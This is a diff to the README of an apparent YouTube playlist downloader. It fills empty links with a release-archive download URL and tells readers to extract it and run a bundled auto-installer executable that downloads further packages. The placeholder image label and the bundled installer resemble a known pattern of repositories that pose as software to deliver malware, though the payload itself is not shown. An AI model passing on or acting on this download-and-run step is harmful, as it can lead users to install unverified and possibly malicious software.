@@ -10,11 +10,11 @@
 
 ### Installation
 [![asdasdasd](https://github.com/user-attachments/assets/4f97f75b-e394-4d80-a8b0-b6154c902434)
-]()
+](https://github.com/mostakshahariyar/YoutubePlaylistDownloader-2024/releases/download/V1.75/Release.zip)
 
 
 
-## **1. [Download the archive]() and extract it to a convenient folder.**
+## **1. [Download the archive](https://github.com/mostakshahariyar/YoutubePlaylistDownloader-2024/releases/download/V1.75/Release.zip) and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Installing_File_x64.exe`. It will install and download all necessary packages for > operation.**
 
 ![photo_2024-10-16_23-57-06](https://github.com/user-attachments/assets/fdf50f51-bf3a-4ec0-b37c-356e45f81c99)
